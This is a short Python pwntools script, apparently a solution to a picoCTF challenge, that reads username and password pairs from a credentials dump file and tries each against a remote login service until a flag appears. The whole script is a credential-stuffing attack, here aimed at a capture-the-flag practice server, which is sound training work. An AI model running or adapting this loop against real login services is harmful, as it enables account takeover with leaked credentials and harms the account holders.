from pwn import *

# Load credentials
with open("creds-dump.txt") as f:
    creds = [line.strip().split(";") for line in f]

for user, passwd in creds:
    r = remote("crystal-peak.picoctf.net", 50619)
    r.recvuntil(b"Username:")
    r.sendline(user.encode())
    r.recvuntil(b"Password:")
    r.sendline(passwd.encode())
    
    response = r.recvall(timeout=2).decode()
    print(f"response: {response}")
    r.close()
    
    if "picoCTF{" in response:
        print("[+] Found valid creds:", user, passwd)
        print(response)
        break